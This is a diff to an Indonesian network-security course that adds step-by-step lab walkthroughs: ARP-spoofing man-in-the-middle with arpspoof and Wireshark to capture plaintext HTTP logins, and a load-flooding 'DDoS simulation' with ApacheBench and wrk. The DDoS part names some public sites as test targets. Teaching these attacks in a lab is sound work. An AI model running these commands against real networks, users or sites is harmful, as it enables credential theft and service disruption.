@@ -6609,12 +6609,8 @@ wireshark capture.pcap &
 
 ---
 
-## **PRAKTIK NETWORK SECURITY - 3 TUGAS BERURUTAN**
+## **tugas 2: Intercept & Sniffing Network Traffic**
 
-Lab praktik hands-on untuk memahami network security vulnerabilities:
-- **TUGAS 1**: Scan 7 Layer di Lingkungan Sekitar
-- **TUGAS 2**: Intercept & Sniffing Network Traffic
-- **TUGAS 3**: Man-in-the-Middle (MITM) - Modifikasi Response
 
 ---
 
@@ -8063,169 +8059,500 @@ BURP SUITE INTERCEPT LAB RESULTS:
 
 ---
 
-### 8.3 Praktik 3: Man-in-the-Middle (MITM) Attack
+### 8.3 Praktik 3: Man-in-the-Middle (MITM) Attack - ARP Spoofing
 
-#### **Tujuan:**
-Melakukan MITM attack untuk demonstrasi bahaya unencrypted communication dan importance of HTTPS.
+#### **Penjelasan Sederhana MITM:**
 
-#### **MITM Lab Architecture:**
+**Bayangan surat lagi:**
 ```
-┌─────────────────────────────────────────────────────┐
-│         MAN-IN-THE-MIDDLE (MITM) LAB               │
-└─────────────────────────────────────────────────────┘
+NORMAL (AMAN):
+┌───────┐      Surat      ┌──────────┐
+│ Anda  │ ──────────────→ │ Teman    │
+└───────┘                 └──────────┘
+Surat sampai langsung ke teman
 
-SCENARIO: ARP Spoofing MITM Attack
-
-NORMAL NETWORK:
-┌──────────┐  ARP: Gateway is...  ┌──────────┐
-│ Client   │   192.168.1.1    ┌───┤ Gateway  │
-└──────────┘   (Legitimate)    │   └──────────┘
-                               │
-                         ┌─────▼──────┐
-                         │  Internet  │
-                         └────────────┘
-
-MITM ATTACK:
-┌────────────────────────────────────────┐
-│     Attacker PC (ARP Spoofer)          │
-│  Tool: Arpspoof or Ettercap           │
-│  Attack: "I am Gateway!" (lies)       │
-│          "I am Client!" (lies)        │
-└────────────┬─────────────────────────┘
-             │
-    ┌────────┴────────────────────┐
-    │                             │
-┌───▼──────┐              ┌──────▼───┐
-│ Client   │◄─────────────┤ Gateway  │
-│ ↓        │              └──────────┘
-│ Attacker sees EVERYTHING
-│ Can modify traffic
-│ Can steal credentials
-└──────────┘
+MITM ATTACK (BAHAYA):
+┌───────┐     ┌─────────┐      ┌──────────┐
+│ Anda  │────→│ Jahat   │────→ │ Teman    │
+└───────┘     │ (Baca   │      └──────────┘
+              │  & Ubah)│
+              └─────────┘
+Surat harus lewat jahat dulu!
+Jahat bisa:
+✓ BACA isinya
+✓ COPY isinya
+✓ UBAH isinya
+✓ Teman tidak tahu
 ```
 
-#### **Praktik Step-by-Step:**
+#### **SETUP UNTUK PRAKTIK - 3 KOMPUTER MINIMAL**
 
-**STEP 1: Setup Lab Network**
+**Komputer yang Dibutuhkan:**
+
 ```
-Three Machines (IMPORTANT: All on SAME network):
+KOMPUTER 1 (CLIENT/KORBAN):
+├─ Nama: "Laptop Korban"
+├─ IP Address: 192.168.1.100 (contoh)
+├─ Tugas: Browsing website normal
+├─ Tidak tahu sedang di-MITM
+└─ Contoh: Bisa pakai laptop teman
 
-Machine A: Client
-├─ IP: 192.168.1.100
-├─ OS: Windows / Linux / macOS
-└─ Will browse websites
+KOMPUTER 2 (ATTACKER/ANDA):
+├─ Nama: "Laptop Hacker" (PC Anda)
+├─ IP Address: 192.168.1.50 (contoh)
+├─ OS: Linux (Ubuntu / Kali recommended)
+├─ Tugas: Jalankan attack
+└─ Tools yang diperlukan:
+   ├─ Wireshark (capture traffic)
+   ├─ Arpspoof (MITM tool)
+   └─ Terminal/CLI
 
-Machine B: Attacker (YOUR MACHINE)
-├─ IP: 192.168.1.50
-├─ OS: Linux recommended (tools available)
-├─ Tools: Arpspoof, Ettercap, Wireshark
-└─ Will perform MITM
-
-Machine C: Router/Gateway
-├─ IP: 192.168.1.1
-├─ Default Gateway for network
-└─ Victim traffic flows through here
-```
-
-**STEP 2: Enable IP Forwarding (Attacker Machine)**
-```
-This allows attacker PC to relay traffic between client & router.
-
-LINUX:
-$ sudo sysctl -w net.ipv4.ip_forward=1
-
-VERIFY:
-$ cat /proc/sys/net/ipv4/ip_forward
-Output: 1 (enabled)
-
-WINDOWS (NOT recommended for this attack):
-Requires manual registry editing
+KOMPUTER 3 (GATEWAY/ROUTER):
+├─ Nama: "WiFi Router"
+├─ IP Address: 192.168.1.1 (GATEWAY)
+├─ Tugas: Gateway ke internet
+└─ Catatan: Bisa juga gateway virtual di laptop
 ```
 
-**STEP 3: Start Packet Capture**
+**Kondisi PENTING:**
 ```
-On Attacker Machine:
-
-$ sudo wireshark
-
-Wireshark:
-├─ Select network interface
-├─ Filter: "tcp.port == 80 or tcp.port == 443"
-└─ START CAPTURE
+⚠️ SEMUA 3 KOMPUTER HARUS DI JARINGAN YANG SAMA!
+└─ Contoh: Semua terhubung ke WiFi "MyNetwork"
+└─ BUKAN hotspot dari attacker (itu Praktik 2)
 ```
 
-**STEP 4: Start ARP Spoofing Attack**
+---
+
+#### **STEP 1: PERSIAPAN - INSTALL TOOLS DI LINUX**
+
+**Buka Terminal & Ketik (copy-paste):**
+
+```bash
+# Update system dulu
+sudo apt update
+
+# Install Wireshark
+sudo apt install -y wireshark
+
+# Install arpspoof (bagian dari dsniff)
+sudo apt install -y dsniff
+
+# Verifikasi instalasi berhasil:
+which arpspoof
+which wireshark
+
+# Output harus menunjukkan path (bukan kosong)
 ```
-Terminal on Attacker Machine (Linux):
 
-$ sudo arpspoof -i eth0 -t 192.168.1.100 192.168.1.1
-                ↑         ↑ Target Client    ↑ Gateway
-                Network   (Victim)
+**Jika sudah terinstall, output akan seperti ini:**
+```
+/usr/sbin/arpspoof
+/usr/bin/wireshark
+```
 
-Output:
+---
+
+#### **STEP 2: CARI INFORMASI JARINGAN**
+
+**Buka Terminal & Ketik:**
+
+```bash
+# Lihat IP address komputer Anda sendiri:
+ifconfig
+
+# atau di Linux modern:
+ip addr show
+```
+
+**Cari informasi penting - TULIS DI KERTAS:**
+```
+DARI OUTPUT, CARI BAGIAN INI:
+
+inet 192.168.1.50       ← IP ANDA (ATTACKER)
+inet 192.168.1.100      ← IP KORBAN (CLIENT)
+inet 192.168.1.1        ← IP GATEWAY (ROUTER)
+
+Interface network: eth0 atau wlan0 ← NAMA INTERFACE
+
+CONTOH OUTPUT:
+───────────────────────────────────────
+eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 192.168.1.50  netmask 255.255.255.0  broadcast 192.168.1.255
+        ether aa:bb:cc:dd:ee:ff  txqueuelen 1000
+───────────────────────────────────────
+
+CATAT:
+IP Attacker = 192.168.1.50 ← PUNYA ANDA
+Interface = eth0 ← NETWORK CARD ANDA
+Gateway = 192.168.1.1 ← ROUTER
+Client/Korban = 192.168.1.100 ← KOMPUTER LAIN
+```
+
+**Cara Cari IP Korban:**
+
+```bash
+# Lihat siapa saja yang connect di network:
+arp-scan -l
+
+OUTPUT CONTOH:
+───────────────────────────────────────
+Interface: eth0, datalink type: EN10MB
+Starting arp-scan 1.9.7 with 256 hosts
+192.168.1.1   aa:bb:cc:dd:ee:01   Gateway Router
+192.168.1.50  aa:bb:cc:dd:ee:02   My Computer (Attacker)
+192.168.1.100 ff:11:22:33:44:55   Client Laptop ← INI KORBAN!
+───────────────────────────────────────
+
+IP Korban = 192.168.1.100
+MAC Address = ff:11:22:33:44:55
+```
+
+---
+
+#### **STEP 3: BUKA WIRESHARK & SIAP CAPTURE**
+
+**Langkah-langkah Membuka Wireshark:**
+
+```
+1. BUKA TERMINAL
+2. Ketik perintah:
+   sudo wireshark &
+   
+3. Tekan ENTER
+4. Tunggu 3-5 detik
+5. Window Wireshark akan terbuka
+```
+
+**SETELAH WIRESHARK TERBUKA - APA YANG ANDA LIHAT:**
+
+```
+┌─────────────────────────────────────────────┐
+│ Wireshark - Network Protocol Analyzer       │ ← Title bar
+├─────────────────────────────────────────────┤
+│ File Edit View Capture Analyze Tools Help   │ ← Menu bar
+├─────────────────────────────────────────────┤
+│ ◀ ▶ ■(Stop) ⚙ ↻ 🔍 ...                   │ ← Toolbar
+├─────────────────────────────────────────────┤
+│ Capture interfaces:                         │ ← Mulai bagian penting
+│                                             │
+│ ☑ eth0 (Ethernet)         ← CLICK INI!     │
+│ ☑ lo (Loopback)          ← Abaikan         │
+│ ☑ wlan0 (WiFi)           ← Bisa juga       │
+│                                             │
+│ ◀  ▶  ⏺  ⚙  ...                           │ ← Tombol
+└─────────────────────────────────────────────┘
+```
+
+**PILIH INTERFACE:**
+
+```
+Lihat di bagian tengah ada daftar interface:
+
+1. Cari interface yang ACTIVE (punya traffic):
+   ├─ eth0 = Kabel ethernet
+   ├─ wlan0 = WiFi
+   └─ Pilih yang sesuai dengan koneksi Anda
+
+2. DOUBLE-CLICK nama interface
+   Contoh: double-click "eth0"
+
+3. Wireshark akan berubah tampilan:
+   ┌──────────────────────────────────────────┐
+   │ Capturing from eth0...                   │
+   │                                          │
+   │ ◼ STOP CAPTURE                          │ ← Tombol merah
+   │                                          │
+   │ Packets: 0 (0.0 MB)                      │
+   └──────────────────────────────────────────┘
+
+4. BIARKAN WIRESHARK CAPTURE
+   (Jangan close dulu)
+```
+
+---
+
+#### **STEP 4: JALANKAN ARP SPOOFING ATTACK (TERMINAL BARU)**
+
+**BUKA TERMINAL BARU (Jangan tutup terminal Wireshark):**
+
+```bash
+# Perintah 1: Spoofing CLIENT
+# Ubah: IP korban & IP gateway sesuai informasi Anda!
+
+sudo arpspoof -i eth0 -t 192.168.1.100 192.168.1.1
+
+# Penjelasan:
+# -i eth0                = Interface yang dipakai
+# -t 192.168.1.100      = Target (KORBAN) IP
+#    192.168.1.1        = Gateway IP
+```
+
+**OUTPUT YANG AKAN MUNCUL:**
+```
 SENT 2 probes (1 broadcast(s))
 Unicasting replies to 192.168.1.100
-
-SECOND TERMINAL (second arpspoof):
-$ sudo arpspoof -i eth0 -t 192.168.1.1 192.168.1.100
-                        ↑ Gateway        ↑ Target Client
-
-This makes gateway think client is attacker
-AND makes client think attacker is gateway!
+SENT 9 probes (8 broadcast(s))
+...
 ```
 
-**STEP 5: Observe MITM in Action**
-```
-On Client Machine:
-- Open browser
-- Try to visit: http://unencrypted-website.com
-  (Must be HTTP, NOT HTTPS)
+**BERARTI: Arpspoof sedang berjalan! ✓**
 
-On Attacker Machine (Wireshark):
-├─ ALL traffic from client → gateway flows THROUGH you
-├─ HTTP passwords visible in plaintext!
-├─ Cookies visible!
-├─ Form data visible!
+---
 
-Example - Login Credentials Captured:
-┌─────────────────────────────────────────┐
-│ TCP Stream Analysis                      │
-│                                          │
-│ POST /login HTTP/1.1                     │
-│ Host: email.local                        │
-│ Content-Type: application/x-www-form    │
-│ Content-Length: 42                      │
-│                                          │
-│ username=john&password=MySecurePass123  │
-│              ↑                 ↑         │
-│        CAPTURED!          CAPTURED!     │
-│ Can now login as john!                  │
-└─────────────────────────────────────────┘
+#### **STEP 5: BUKA TERMINAL KETIGA - ARP SPOOFING REVERSE**
+
+**BUKA TERMINAL KETIGA:**
+
+```bash
+# Perintah 2: Spoofing GATEWAY
+# Ubah: IP gateway & IP korban sesuai informasi!
+
+sudo arpspoof -i eth0 -t 192.168.1.1 192.168.1.100
+
+# Penjelasan:
+# KALI INI kebalikan!
+# -t 192.168.1.1       = Target GATEWAY
+#   192.168.1.100      = CLIENT IP
 ```
 
-**STEP 6: SSL/HTTPS Downgrade Attack (Advanced)**
+**OUTPUT YANG AKAN MUNCUL:**
 ```
-If victim accesses HTTPS site:
+SENT 2 probes (1 broadcast(s))
+Unicasting replies to 192.168.1.1
+...
+```
 
-WITHOUT Attack:
-Client ──HTTPS─→ Server (Encrypted)
-Client ←─HTTPS─ Server (Encrypted)
-✓ Attacker cannot see traffic
+**SEKARANG ANDA PUNYA 3 TERMINAL TERBUKA:**
+```
+Terminal 1: Wireshark (buka pane besar)
+Terminal 2: Arpspoof (spoofing client) - berjalan
+Terminal 3: Arpspoof (spoofing gateway) - berjalan
+```
 
-WITH MITM (SSL Stripping):
-Client ──HTTP──→ Attacker ──HTTPS──→ Server
-Client ←─HTTP── Attacker ←─HTTPS── Server
+---
 
-Attacker:
-├─ Intercepts HTTPS from server
-├─ Downgrade to HTTP with client
-├─ Client thinks it's normal
-├─ Credentials captured in plaintext!
+#### **STEP 6: LIHAT WIRESHARK MULAI CAPTURE DATA**
 
-Tool: sslstrip
-$ sudo sslstrip -l 8080
+**KEMBALI KE WIRESHARK (Yang sudah dibuka Step 3):**
 
-Result: HTTPS appears as HTTP to victim!
+**APA YANG HARUS TERJADI:**
+
+```
+Sebelum MITM:
+┌────────────────────────────────────────┐
+│ Packets: 0 (0.0 MB)                    │
+│ Capturing from eth0...                 │
+└────────────────────────────────────────┘
+
+Sesudah ARP Spoofing Dijalankan:
+┌────────────────────────────────────────┐
+│ Packets: 1234 (3.5 MB)                │ ← Mulai bertambah!
+│ Capturing from eth0...                 │
+│                                        │
+│ No.  Time        Source    Dest   ... │ ← Paket mulai muncul
+│ 1    0.001234    192...    192... ... │
+│ 2    0.001456    192...    192... ... │
+│ 3    0.002789    192...    192... ... │
+│ ...                                    │
+└────────────────────────────────────────┘
+```
+
+**JIKA PAKET TIDAK BERTAMBAH = ERROR**
+```
+Troubleshoot:
+├─ Cek IP address benar?
+├─ Cek interface benar (eth0 vs wlan0)?
+├─ Cek arpspoof sudah jalan (lihat terminal)?
+└─ Cek korban benar-benar browsing?
+```
+
+---
+
+#### **STEP 7: LIHAT DATA YANG TERTANGKAP**
+
+**DI WIRESHARK - LIHAT PACKET LIST (TOP):**
+
+```
+Klik pada paket HTTP (jika ada):
+- Cari "HTTP" di kolom "Protocol"
+- Atau "GET" di kolom "Info"
+```
+
+**SETELAH CLICK PAKET:**
+
+```
+Wireshark akan menampilkan 3 bagian:
+
+BAGIAN 1 (TOP): Daftar Paket
+┌─────────────────────────────────────┐
+│ No. │ Source    │ Dest      │ Proto │
+├─────┼───────────┼───────────┼───────┤
+│ 42  │ 192.168.. │ 192.168.. │ HTTP  │ ← CLICK INI
+└─────────────────────────────────────┘
+
+BAGIAN 2 (MIDDLE): Detail Paket
+┌──────────────────────────────────────┐
+│ ▶ Frame                              │
+│ ▶ Ethernet II                        │
+│ ▶ Internet Protocol Version 4        │
+│ ▶ Transmission Control Protocol      │
+│ ▶ HyperText Transfer Protocol        │ ← EXPAND INI
+│   ├─ GET /                           │
+│   ├─ Host: example.com               │
+│   ├─ User-Agent: Mozilla             │
+│   └─ Cookie: sessionid=abc...        │ ← DATA!
+└──────────────────────────────────────┘
+
+BAGIAN 3 (BOTTOM): Raw Data (Hex)
+┌──────────────────────────────────────┐
+│ 4745 5420 2f20 4854 5450 2f31 2e31  │ ← Abaikan
+│ 0d0a 486f 7374 3a20 6578 616d ...   │
+└──────────────────────────────────────┘
+```
+
+---
+
+#### **STEP 8: EXTRACT CREDENTIALS (JIKA ADA)**
+
+**PADA KORBAN - BUAT DIA BROWSING HTTP WEBSITE DENGAN LOGIN:**
+
+```
+Minta korban untuk:
+1. Buka browser
+2. Cari website HTTP (bukan HTTPS) dengan login
+   Contoh: http://testphp.vulnweb.com
+3. Login dengan username & password apapun
+4. Kirim form
+```
+
+**DI WIRESHARK - LIHAT DATA:**
+
+```
+Filter: http.request.method == "POST"
+(Ini untuk lihat hanya form submission)
+
+Output akan menunjukkan:
+┌──────────────────────────────────────────────┐
+│ POST /login HTTP/1.1                         │
+│ Host: testphp.vulnweb.com                    │
+│ Content-Type: application/x-www-form-...    │
+│ Content-Length: 32                           │
+│                                              │
+│ username=john&password=MyPassword123         │
+│           ↑                     ↑             │
+│       CAPTURED!           CAPTURED!          │
+└──────────────────────────────────────────────┘
+```
+
+**KESIMPULAN:**
+```
+✓ Anda sudah melihat:
+  ├─ Username: john
+  ├─ Password: MyPassword123
+  ├─ Website: testphp.vulnweb.com
+  └─ Semuanya PLAINTEXT (tidak enkripsi)
+
+✓ Sekarang Anda bisa login dengan credentials itu!
+```
+
+---
+
+#### **STEP 9: HENTIKAN ATTACK**
+
+**JIKA SUDAH SELESAI - TEKAN Ctrl+C PADA SEMUA TERMINAL:**
+
+```
+Terminal 1 (Wireshark):
+- Menu: Capture → Stop
+- Atau: Click tombol Stop (square merah)
+
+Terminal 2 (Arpspoof #1):
+- Tekan: Ctrl+C
+
+Terminal 3 (Arpspoof #2):
+- Tekan: Ctrl+C
+
+Result:
+```
+ATTACK STOPPED
+Korban network kembali normal
+```
+```
+
+---
+
+#### **STEP 10: SAVE CAPTURE & ANALISIS NANTI**
+
+**DI WIRESHARK - SIMPAN DATA:**
+
+```
+Menu: File → Save As
+
+Akan muncul dialog:
+┌──────────────────────────────────────┐
+│ Save file as:                        │
+│                                      │
+│ Filename: [untitled-000]             │ ← Edit nama
+│ Type: Wireshark pcapng (*.pcapng)    │
+│ Location: /home/user/Documents       │
+│                                      │
+│ [Save] [Cancel]                      │
+└──────────────────────────────────────┘
+
+Ubah filename menjadi: MITM_Attack_2025
+
+Klik: [Save]
+```
+
+---
+
+#### **TABEL PERBANDINGAN: PRAKTIK 2 vs PRAKTIK 3**
+
+```
+┌──────────────────┬──────────────────────┬──────────────────────┐
+│ ASPEK            │ PRAKTIK 2             │ PRAKTIK 3            │
+│                  │ (BURP PROXY)          │ (ARP SPOOFING)       │
+├──────────────────┼──────────────────────┼──────────────────────┤
+│ Cara Kerja       │ Korban config proxy   │ Attacker: network    │
+│                  │ manual ke attacker    │ "jadi" gateway       │
+├──────────────────┼──────────────────────┼──────────────────────┤
+│ Setup            │ Perlu hotspot         │ Perlu network biasa  │
+│                  │ Perlu PAC server      │ (WiFi/LAN punya      │
+│                  │ Perlu Burp Suite      │ gateway)             │
+│                  │                       │ Perlu Arpspoof       │
+├──────────────────┼──────────────────────┼──────────────────────┤
+│ Deteksi          │ Mudah (proxy visible) │ Sulit (transparent)  │
+│ Oleh Korban       │                       │                      │
+├──────────────────┼──────────────────────┼──────────────────────┤
+│ Kemampuan        │ Intercept & modify    │ Hanya capture        │
+│                  │ response              │ (tidak modify)       │
+├──────────────────┼──────────────────────┼──────────────────────┤
+│ Real-world       │ Coffee shop attacker  │ Network admin        │
+│ Scenario         │ (share hotspot)       │ (control router)     │
+├──────────────────┼──────────────────────┼──────────────────────┤
+│ Kesulitan        │ MUDAH                 │ SULIT (butuh Linux)  │
+│ Implementasi     │ (Bisa di Windows)     │                      │
+├──────────────────┼──────────────────────┼──────────────────────┤
+│ Pembelajaran     │ Understanding proxy   │ Understanding ARP    │
+│                  │ & MITM concept        │ & layer 2 attacks    │
+└──────────────────┴──────────────────────┴──────────────────────┘
+```
+
+---
+
+#### **CHECKLIST - PRAKTIK 3 BERHASIL?**
+
+```
+✓ Sudah install tools (wireshark, arpspoof)?
+✓ Sudah catat IP address (attacker, client, gateway)?
+✓ Sudah buka Wireshark & pilih interface?
+✓ Sudah jalankan 2x arpspoof di 2 terminal?
+✓ Sudah lihat paket masuk di Wireshark?
+✓ Sudah lihat username/password di captured paket?
+✓ Sudah save capture file?
+
+JA semua = PRAKTIK 3 BERHASIL! ✓
+TIDAK semua = Cek troubleshooting di atas
 ```
 
 #### **MITM Lab Report:**
@@ -8317,6 +8644,1119 @@ ETHICAL HACKING CERTIFIED PATHS:
 ├─ OSCP (Offensive Security Certified Professional)
 ├─ Security+, CISSP - CompTIA/ISC²
 └─ HackerOne, BugBounty Programs (Legal bug hunting)
+```
+
+---
+
+---
+
+### 8.4 Tugas 4: Simulasi DDoS Attack Menggunakan Tools (ApacheBench & wrk)
+
+#### **Penjelasan Sederhana DDoS:**
+
+**Bayangan Restoran:**
+```
+NORMAL (Restoran Sepi):
+Pelayan: 10 orang
+Pelanggan: 5 orang
+Pelayanan: Cepat, lancar
+
+DDoS ATTACK (Serangan Spam):
+Pelayan: 10 orang (tetap)
+"Pelanggan": 10,000 orang sekaligus
+├─ 5 pelanggan asli
+├─ 9,995 orang spam yang buru-buru keluar
+Hasil:
+├─ Pelayan kewalahan
+├─ Pelanggan asli tidak dilayani
+├─ Restoran crash
+└─ Semua orang pulang
+
+ANALOGI HTTP:
+Server = Restoran
+Request = Pelanggan
+DDoS = Banjir request palsu
+Result = Server tidak bisa layani pelanggan asli
+```
+
+---
+
+#### **JENIS-JENIS DDOS TOOLS:**
+
+```
+TOOLS POPULER:
+
+1. ApacheBench (ab)
+   ├─ Cara pakai: MUDAH (1 baris command)
+   ├─ Kecepatan: Lambat (sequential)
+   ├─ Cocok untuk: Testing lokal/lab
+   └─ Instalasi: Sudah ada di Ubuntu
+
+2. WRK (Wrk Benchmark Tool)
+   ├─ Cara pakai: MUDAH
+   ├─ Kecepatan: CEPAT (multi-thread)
+   ├─ Cocok untuk: Testing lokal/lab
+   └─ Instalasi: Perlu download
+
+3. Hping3
+   ├─ Cara pakai: Medium (TCP/UDP/ICMP)
+   ├─ Kecepatan: Sangat cepat
+   ├─ Cocok untuk: Packet-level attack
+   └─ Instalasi: apt install hping3
+
+4. Slowhttptest
+   ├─ Cara pakai: Kompleks
+   ├─ Tipe: Slow attack (membuat koneksi lambat)
+   ├─ Cocok untuk: Testing slow DDoS
+   └─ Instalasi: Compile dari source
+
+UNTUK PRAKTEK INI, KAMI PAKAI:
+- ApacheBench (Mudah, cepat dipelajari)
+- WRK (Modern, fast, mirip real attack)
+```
+
+---
+
+#### **SETUP & INSTALASI**
+
+**BUKA TERMINAL & INSTALL TOOLS:**
+
+```bash
+# Update package list
+sudo apt update
+
+# Install ApacheBench (ab)
+sudo apt install -y apache2-utils
+
+# Verifikasi instalasi
+ab -h
+
+# Output harus menunjukkan help menu ApacheBench
+```
+
+**INSTALL WRK (Jika ingin lebih advanced):**
+
+```bash
+# Install dependencies
+sudo apt install -y git build-essential libssl-dev
+
+# Clone WRK repository
+git clone https://github.com/wg/wrk.git
+cd wrk
+
+# Compile WRK
+make
+
+# Verifikasi
+./wrk --help
+```
+
+---
+
+#### **PRAKTIK 4A: DDOS MENGGUNAKAN APACHE BENCH (MUDAH)**
+
+**STEP 1: SIAPKAN TARGET WEBSITE**
+
+```
+Anda memerlukan website yang bisa di-attack.
+Opsi:
+
+OPSI 1: Website lokal (Paling aman untuk praktik)
+Buka terminal baru:
+$ python3 -m http.server 8080
+
+Output:
+Serving HTTP on 0.0.0.0 port 8080
+
+Jangan close terminal ini!
+
+OPSI 2: Website online yang siap di-test:
+- httpbin.org
+- example.com
+- petstore.swagger.io
+
+⚠️ JANGAN attack website orang tanpa permission!
+   (Illegal!)
+```
+
+**STEP 2: BUKA TERMINAL BARU**
+
+```
+(Jangan tutup terminal website lokal)
+
+Terminal baru:
+$ cd ~/
+
+Siap untuk test
+```
+
+**STEP 3: JALANKAN APACHE BENCH - REQUEST NORMAL**
+
+```bash
+# Test NORMAL (contoh):
+ab -n 100 -c 10 http://localhost:8080/
+
+# Penjelasan:
+# -n 100  = Total request (100 kali)
+# -c 10   = Concurrent (10 request bersamaan)
+# URL     = Target website
+```
+
+**OUTPUT YANG AKAN MUNCUL:**
+
+```
+This is ApacheBench, Version 2.3
+Benchmarking localhost (be patient)
+Completed 10 requests
+Completed 20 requests
+Completed 30 requests
+...
+Completed 100 requests
+
+Finished 100 requests
+
+Server Software:        SimpleHTTP/0.6
+Server Hostname:        localhost
+Server Port:            8080
+
+Document Path:          /
+Document Length:        615 bytes
+
+Concurrency Level:      10
+Time taken for tests:   0.234 seconds
+Complete requests:      100
+Failed requests:        0
+Requests per second:    427.35 [#/sec]
+Time per request:       23.394 [ms]
+Time per request:       2.339 [ms] (mean, across all concurrent requests)
+Transfer rate:          901.16 [Kbytes/sec received]
+
+Connection Times (ms)
+              min  mean[+/-sd] median   max
+Connect:        1    5   2.1      5      10
+Processing:     3   15   4.2     14      28
+Waiting:        2   10   3.1      9      24
+Total:          6   20   5.0     19      38
+```
+
+**ANALISIS OUTPUT:**
+```
+Requests per second: 427.35 ← Server BISA handle 427 request/detik
+Failed requests: 0 ← Semua request berhasil
+Time taken: 0.234 seconds ← Cepat
+```
+
+---
+
+**STEP 4: JALANKAN DDOS - DENGAN JUMLAH BESAR**
+
+```bash
+# DDoS Attack (SIMULASI):
+ab -n 10000 -c 100 http://localhost:8080/
+
+# Penjelasan:
+# -n 10000 = 10,000 total request (BANYAK!)
+# -c 100   = 100 concurrent (100 bersamaan)
+# Server akan KEWALAHAN
+```
+
+**YANG TERJADI:**
+
+```
+SAAT BERJALAN:
+Completed 100 requests
+Completed 200 requests
+Completed 300 requests
+...
+
+JIKA SERVER CRASH, OUTPUT:
+WARNING: aproc.c:242: apr_socket_recv: Connection reset by peer (104)
+Failed requests:  X
+Broken pipe:      Y
+
+KESIMPULAN:
+✓ Server tidak bisa handle 10,000 request
+✓ Beberapa request gagal
+✓ Inilah DDoS attack!
+```
+
+---
+
+**STEP 5: MONITORING SERVER SAAT ATTACK**
+
+**BUKA TERMINAL KETIGA (JANGAN TUTUP YANG LAIN):**
+
+```bash
+# Monitor resource server
+top
+
+# Atau lebih detail:
+htop
+
+# Output akan menunjukkan:
+- CPU usage naik drastis
+- Memory naik
+- Load average tinggi
+- Process "python3" atau "http.server" dominan
+```
+
+**LIHAT DI TOP:**
+```
+top - 14:25:30 up 1:23, 1 user, load average: 9.82, 5.23, 2.14
+Tasks: 45 total, 2 running, 43 sleeping
+
+PID   USER  PR  NI  VIRT  RES  SHR  S  %CPU %MEM COMMAND
+1234  user  20   0  45M  8.5M 5.2M S  89.5  2.1 python3 -m http.server
+5678  user  20   0  2.1G 234M 180M S  12.3  8.9 ab -n 10000 -c 100
+
+Load average: 9.82 ← Sangat tinggi (normal = 1-2)
+```
+
+---
+
+#### **PRAKTIK 4B: DDOS MENGGUNAKAN WRK (LEBIH MODERN)**
+
+**STEP 1: SETUP SEPERTI SEBELUMNYA**
+
+```bash
+# Terminal 1: Jalankan website lokal
+python3 -m http.server 8080
+
+# Terminal 2: Buka baru
+cd ~/wrk
+```
+
+**STEP 2: JALANKAN WRK - NORMAL**
+
+```bash
+# Test NORMAL:
+./wrk -t4 -c100 -d10s http://localhost:8080/
+
+# Penjelasan:
+# -t4     = 4 threads (4 "pekerja")
+# -c100   = 100 connections (concurrent)
+# -d10s   = 10 seconds duration
+# URL     = Target
+```
+
+**OUTPUT WRK:**
+
+```
+Running 10s test @ http://localhost:8080/
+  4 threads and 100 connections
+  Thread Stats   Avg      Stdev    Max
+    Latency    23.45ms   12.34ms  234.50ms
+    Req/Sec    2389.23    456.78   3456.00
+
+  95483 requests in 10.05s, 58.23MB read
+Requests/sec:   9499.30
+Transfer/sec:    5.79MB
+```
+
+**ANALISIS:**
+```
+Requests/sec: 9499.30 ← WRK bisa kirim 9,499 request/detik
+Total requests: 95,483 ← Dalam 10 detik
+Transfer: 58.23MB ← Banyak data
+```
+
+---
+
+**STEP 3: ATTACK DENGAN WRK - INTENSITAS TINGGI**
+
+```bash
+# DDoS dengan WRK (LEBIH KUAT):
+./wrk -t8 -c500 -d30s http://localhost:8080/
+
+# Penjelasan:
+# -t8     = 8 threads (lebih banyak)
+# -c500   = 500 connections (banyak!)
+# -d30s   = 30 seconds
+# Server akan sangat overwhelmed
+```
+
+**HASIL:**
+
+```
+Server akan mulai:
+- Response time naik drastis
+- Requests failed: naik
+- Load average: 50+
+- Browser akses normal: SANGAT LAMBAT atau TIMEOUT
+```
+
+---
+
+#### **ANALISIS SERANGAN DDOS**
+
+**PERBEDAAN ApacheBench vs WRK:**
+
+```
+┌──────────────────┬──────────────────────┬──────────────────────┐
+│ ASPEK            │ ApacheBench (ab)     │ WRK                  │
+├──────────────────┼──────────────────────┼──────────────────────┤
+│ Kecepatan        │ Lambat (sequential)  │ Cepat (multi-thread) │
+│                  │ ~400 req/sec         │ ~9000 req/sec        │
+├──────────────────┼──────────────────────┼──────────────────────┤
+│ Kemudahan        │ SANGAT MUDAH         │ Medium (perlu install)│
+│                  │ 1 baris command      │ Lebih options        │
+├──────────────────┼──────────────────────┼──────────────────────┤
+│ Detail hasil     │ Lengkap              │ Sangat lengkap       │
+├──────────────────┼──────────────────────┼──────────────────────┤
+│ Real-world DDoS  │ Jauh dari reality    │ Mirip real attack    │
+├──────────────────┼──────────────────────┼──────────────────────┤
+│ Best for         │ Pemula / lab basic   │ Advanced testing     │
+└──────────────────┴──────────────────────┴──────────────────────┘
+```
+
+---
+
+#### **MONITORING HASIL ATTACK**
+
+**TOOLS MONITORING SAAT ATTACK:**
+
+```bash
+# Terminal lain - REAL TIME MONITORING:
+
+# Option 1: Top (lebih simple)
+top
+
+# Option 2: Htop (lebih rapi)
+htop
+
+# Option 3: Monitor detail network
+iftop
+
+# Option 4: Monitor connection
+netstat -an | grep ESTABLISHED | wc -l
+(Hitung berapa koneksi terbuka)
+
+# Option 5: Monitor CPU intensive process
+ps aux | grep python
+```
+
+**APA YANG DILIHAT SAAT DDoS:**
+
+```
+SEBELUM ATTACK:
+- Load average: 0.5 - 1.0 (Normal)
+- CPU: 10-20% (Idle)
+- Memory: 30-40% (Stabil)
+
+SAAT ATTACK:
+- Load average: 15-50+ (SANGAT TINGGI)
+- CPU: 80-100% (PENUH)
+- Memory: 80-90% (HAMPIR PENUH)
+- Koneksi TCP: 10,000+ (BANYAK)
+
+AKIBATNYA:
+- Website response time: dari 20ms → 1000ms+
+- Request failed: mulai ada yang gagal
+- User experience: SANGAT JELEK (timeout)
+- Browser hang/tidak responsive
+```
+
+---
+
+#### **CHECKLIST PRAKTIK 4:**
+
+```
+✓ Sudah install apache2-utils (ab)?
+✓ Sudah jalankan website lokal (python http.server)?
+✓ Sudah jalankan ab dengan -n 100 -c 10 (test normal)?
+✓ Sudah lihat output ApacheBench?
+✓ Sudah jalankan ab dengan -n 10000 -c 100 (DDoS)?
+✓ Sudah lihat resource monitor (top/htop)?
